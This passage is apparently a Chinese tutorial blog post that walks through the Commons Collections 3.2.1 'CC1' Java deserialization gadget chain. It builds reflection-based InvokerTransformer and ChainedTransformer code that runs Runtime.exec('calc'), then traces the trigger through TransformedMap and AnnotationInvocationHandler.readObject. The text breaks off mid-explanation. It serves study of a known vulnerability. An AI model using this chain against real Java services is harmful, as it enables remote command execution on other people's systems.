alt="image-20240705214001199"></p><blockquote><p>以防有人基础不牢，比如我。此处为java的一些易漏前置知识。</p><p>java以是否有static关键字区分了实例方法和静态方法。</p><ul><li>实例方法：必须通过已经实例化的对象来调用。例如，如果你有一个名为MyClass的类，并且它有一个实例方法doSomething()，你需要先创建MyClass的一个实例，然后通过这个实例来调用方法，如<code>MyClass instance = new MyClass(); instance.doSomething();</code>。</li><li>静态方法（可以直接调用的方法）：可以通过类名直接调用，无需创建类的实例。例如，如果MyClass有一个静态方法staticMethod()，你可以直接通过类名调用它，如MyClass.staticMethod();</li></ul></blockquote><p>Runtime.exec()就是实例方法，需要在实例化对象上进行调用。Runtime.getRuntime()返回一个单例实例。</p><blockquote><p>因为Runtime类没有公开的构造方法，getRuntime()方法实际上是返回了该类的一个单例实例。这样做可以确保整个应用程序中只有一个Runtime实例存在，这样可以更好地管理资源和环境交互</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220412807.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220412807.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240705220412807"></p></blockquote><p>所以使用<code>Runtime.getRuntime().exec(&quot;calc&quot;);</code>就能调用系统计算器。</p><p>但是Runtime类没有继承Serializable，所以不能序列化。InvokerTransformer继承了Serializable，且其transformer调用了invoke，有invoke当然就能用invoke反射调用到Runtime中的exec。反射知识：<a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html">https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705215406266.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705215406266.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240705215406266"></p><p>先把<code>Runtime.getRuntime.exec(&quot;calc&quot;);</code>改为反射调用：</p><p>其中invoke调用格式为：<code>方法.invoke(对象,参数)</code></p><p>getMethod调用格式为：<code>对象.getMethod(方法名,该方法参数类型)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">m.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>getRuntime()是不是也能顺便改成反射了呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码1</span></span><br><span class="line">Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//getRuntime无参，即null</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">r</span> <span class="operator">=</span> gMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//执行getRuntime，静态方法无需实例，第一个参数为null；</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);<span class="comment">//exec参数类型为string</span></span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><p>pom dependency：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>报maven插件版本错误的：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-site-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>去找个jdk源码版或者OpenJDK找对应jdk版本的sun包复制对应目录才能正常调试。</p><p>偷懒链接：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/af660750b2f4.zip</a></p><h3 id="改造Runtime为可序列化"><a href="#改造Runtime为可序列化" class="headerlink" title="改造Runtime为可序列化"></a>改造Runtime为可序列化</h3><p>CC1用InvokerTransformer.transform代为执行invoke，且满足了继承Serializable序列化可传输的功能。</p><p><code>Class&lt;?&gt; c = Runtime.class;</code>是可以序列化的。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162849477.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162849477.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709162849477"></p><p>根据上面的代码1，可以很轻松地用InvokerTransformer的构造方法传入反射执行的参数。从而替代代码1</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220821452.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705220821452.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240705220821452"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705223655683.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240705223655683.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240705223655683"></p><p>仔细阅读transform的代码，InvokerTransformer传入的第一个参数为getMethod调用的方法名，第二个参数为该方法所需的形参类型，第三个参数为该方法执行时传入的形参。而transform接收的参数为实例对象。</p><ol><li><code>Method gMethod = c.getMethod(&quot;getRuntime&quot;,null);</code>可替换为：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">getMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> (Method) getMethod.transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>因为getMethod接收的形参类型如下：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708150513048.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708150513048.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240708150513048"></p><p>String对应String.class   Class&lt;?&gt;对应Class[].class</p><p>进一步可简化为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><ol start="2"><li>同理，<code>Object r = gMethod.invoke(null,null);</code>可以改写为：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(gMethod);</span><br></pre></td></tr></table></figure><ol start="3"><li><code>Method execMethod = c.getMethod(&quot;exec&quot;, String.class);</code>可改写为：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><ol start="4"><li><code>execMethod.invoke(r,&quot;calc&quot;);</code>可改写为：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;r,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;).transform(execMethod);</span><br></pre></td></tr></table></figure><p>依旧能达到效果</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708155629476.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708155629476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240708155629476"></p><p>如果在第三句，使用Runtime类型存储invoke结果，即Runtime.getRuntime()实例，则能在此实例上直接调用exec：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;Runtime&gt; c = Runtime.class;</span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);<span class="comment">//getRuntime无参，即null</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) gMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);<span class="comment">//执行getRuntime，静态方法无需实例，第一个参数为null；</span></span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>则该代码修改为InvokeTransformer版只需三句，且为链式（上一个结果传入下一个形参）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码2</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(gMethod);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>到这里就成功一半了</p><p>但是这样连续写三遍会不会很麻烦？ChainedTransformer接收一个transformer数组，且ChainedTransformer.transform()会对该数组进行链式调用。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708162342590.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708162342590.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240708162342590"></p><p>InvokerTransformer实现了Transformer接口，new的实例可以赋值给父类或接口，即改写如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码3</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure><h3 id="TransformedMap-checkValue-触发transformer"><a href="#TransformedMap-checkValue-触发transformer" class="headerlink" title="TransformedMap.checkValue()触发transformer"></a>TransformedMap.checkValue()触发transformer</h3><p>执行命令的部分写好了，现在倒回去找触发到readObject的部分，无论是否经过ChainedTransformer，都是调用transform()方法。查看其用法：</p><p>使用到该方法的类很多，比如以下三个：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>这里的LazyMap和TransformedMap都存在反序列化链。先来看TransformedMap#checkSetValue()</p><p>调用了valueTransformer的transform方法。使valueTransformer为指定的ChainedTransformer即可</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164927727.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164927727.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>注意到该类存在一个静态方法decorate()，可以绑定valueTransformer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708204933735.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708204933735.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240708204933735"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708225702298.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708225702298.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><blockquote><p>protected构造方法大概率会被函数内其他public方法调用</p></blockquote><p>那在哪调用了checkSetValue()呢？答案就在TransformedMap的父类中</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709145957991.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709145957991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709145957991"></p><p>在AbstractInputCheckedMapDecorator的静态内部类MapEntry的setValue方法中调用了checkSetValue()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142636991.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142636991.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709142636991"></p><p>该静态内部类继承了AbstractMapEntryDecorator，在使用entrySet()遍历entry时能调用该setValue()</p><blockquote><p>Entry从理解上来看，指map内的一对键值对，如map&lt;”key”,”value”&gt;</p><p>protected方法也能在该类嵌套外的类直接使用</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142836958.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709142836958.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709142836958"></p><p>现在理一遍逻辑，把上文构造的chainedTransformer用decorate()写入this.valueTransformer。这里需要一个map作为第一个参数，新建一个HashMap传入，随便put进一个Entry，这样才能进入遍历。（一个都没有当然不能遍历，也不能setValue）</p><p>checkSetValue的参数在调用setValue时传入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150244470.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150244470.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709150244470"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150339376.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150339376.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709150339376"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="keyword">for</span>(Map.Entry entry:transformedMap.entrySet())&#123;</span><br><span class="line">entry.setValue(Runtime.class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为什么遍历能使用setValue-？"><a href="#为什么遍历能使用setValue-？" class="headerlink" title="为什么遍历能使用setValue()？"></a>为什么遍历能使用setValue()？</h3><p>为什么该抽象类的MapEntry内的方法为什么能在遍历map.entrySet()时使用？下文可以略过，想要深入理解需要把AbstractInputCheckedMapDecorator从上到下分析。</p><blockquote><p>首先看entrySet()函数，调用该函数会返回一个Set集合，且if默认为真，调用EntrySet静态内部类对原始的map.entrySet()进行装配（静态内部类能在外部类直接实例化）</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150638066.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150638066.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709150638066"></p><p>this关键字指的是当前实例（或对象）。当代码中使用this时，它代表的是调用这个方法的具体实例。在这个特定的上下文中，意味着EntrySet构造函数接收当前实例作为一个参数，这样新创建的EntrySet对象可以访问和利用当前实例的属性和方法，比如isSetValueChecking()方法。</p><p>map.entrySet()返回由Map.Entry组成的原始集合</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150811929.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709150811929.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709150811929"></p><p>在EntrySet类中，迭代器使用了EntrySetInterator进行迭代</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154643257.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154643257.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709154643257"></p><p>重写了迭代中会使用的next()，在这里就返回了MapEntry装饰的Map.Entry</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154900823.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709154900823.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709154900823"></p><p>自然调用setValue()是使用MapEntry的setValue()，而不是使用下列红框的原始setValue()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709160029659.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709160029659.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709160029659"></p><p>这里可能会有疑问了，为什么for循环就使用迭代器了呢？</p><p>没错，这里用到的增强型for循环（也叫foreach循环）实际上是通过迭代器实现的。尽管代码中没有显式使用迭代器。增强for循环工作原理如下：</p><blockquote><p><strong>获取迭代器</strong>：调用集合对象的 <code>iterator()</code> 方法，获取一个 <code>Iterator</code> 对象。</p></blockquote><blockquote><p><strong>检查是否有下一个元素</strong>：调用 <code>Iterator</code> 对象的 <code>hasNext()</code> 方法，检查是否有下一个元素。</p></blockquote><blockquote><p><strong>获取下一个元素</strong>：如果 <code>hasNext()</code> 返回 <code>true</code>，则调用 <code>Iterator</code> 对象的 <code>next()</code> 方法，获取下一个元素。</p></blockquote><blockquote><p><strong>执行循环体</strong>：将获取的元素赋值给循环变量，并执行循环体。</p></blockquote><p>这意味着每次循环实际上是在使用迭代器遍历集合。</p><p>即遍历调用setValue背后的详细步骤如下：</p><ol><li><strong>获取迭代器</strong>：增强型 <code>for</code> 循环隐式调用 <code>transformedMap.entrySet().iterator()</code>，获取 <code>Iterator</code> 对象。</li><li><strong>检查是否有下一个元素</strong>：增强型 <code>for</code> 循环隐式调用 <code>Iterator</code> 对象的 <code>hasNext()</code> 方法。</li><li><strong>获取下一个元素</strong>：如果 <code>hasNext()</code> 返回 <code>true</code>，增强型 <code>for</code> 循环隐式调用 <code>Iterator</code> 对象的 <code>next()</code> 方法。</li><li><strong>执行循环体</strong>：将 <code>next()</code> 方法返回的元素赋值给 <code>entry</code> 变量，然后执行循环体中的 <code>entry.setValue(Runtime.class)</code>。</li></ol><p>在 <code>TransformedMap</code> 的实现中，这个过程会涉及到以下类和方法：</p><ul><li>其父类的<code>EntrySet</code> 类的 <code>iterator()</code> 方法返回一个 <code>EntrySetIterator</code> 对象。</li><li><code>EntrySetIterator</code> 类的 <code>next()</code> 方法返回一个 <code>MapEntry</code> 对象。</li><li><code>MapEntry</code> 类的 <code>setValue()</code> 方法调用 <code>TransformedMap</code> 的 <code>checkSetValue()</code> 方法来检查或转换值，然后调用原始 <code>Map.Entry</code> 的 <code>setValue()</code> 方法。</li></ul><p>所以<code>for(Map.Entry entry:transformedMap.entrySet())&#123;entry.setValue(Runtime.class);&#125;</code>换成经典的迭代器你就会很容易理解了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="comment">//代码4</span></span><br><span class="line">&gt;HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">&gt;map.put(<span class="string">&quot;key&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">&gt;Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">&gt;<span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> transformedMap.entrySet().iterator();</span><br><span class="line">&gt;<span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line"> Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry&lt;Object,Object&gt;) it.next();</span><br><span class="line"> entry.setValue(Runtime.class);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162016938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709162016938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709162016938"></p><h3 id="寻找readObject"><a href="#寻找readObject" class="headerlink" title="寻找readObject"></a>寻找readObject</h3><p>牢记，最后是readObject触发反序列化。刚好在AnnotationInvocationHandler的readObject里找到了调用setValue的部分，虽然其参数不可控。</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170205275.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170205275.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709170205275"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170357665.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709170357665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20240709170357665"></p><p>进入到setValue中，需要把memberValues设置为transformedMap，该属性在其私有构造函数中进行赋值</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171213495.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709171213495.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 